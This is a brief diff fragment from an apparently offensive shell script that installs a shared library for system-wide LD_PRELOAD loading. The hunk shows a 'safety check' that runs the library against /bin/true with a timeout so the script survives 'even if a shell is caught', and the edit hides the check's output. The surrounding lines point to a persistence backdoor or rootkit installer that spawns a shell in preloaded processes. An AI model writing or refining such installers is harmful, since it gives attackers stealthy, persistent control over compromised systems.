@@ -18,8 +18,8 @@ chmod 644 "$SO_DEST"
 # -- SAFETY CHECK --
 # This runs /bin/true with library. If it segfaults, stop before editing preload
 echo "[*] Verifying library integrity..."
-# timeout 2 ensures the script continues even if a shell is caught
-if ! timeout 2 bash -c "LD_PRELOAD='$SO_DEST' /bin/true"; then
+# timeout 2 allows the script to continue even if a shell is caught
+if ! timeout 2 bash -c "LD_PRELOAD='$SO_DEST' /bin/true" >/dev/null 2>&1; then
     echo "[-] CRITICAL FAILURE: Library is unstable!"
     rm -f "$SO_DEST"
     exit 1
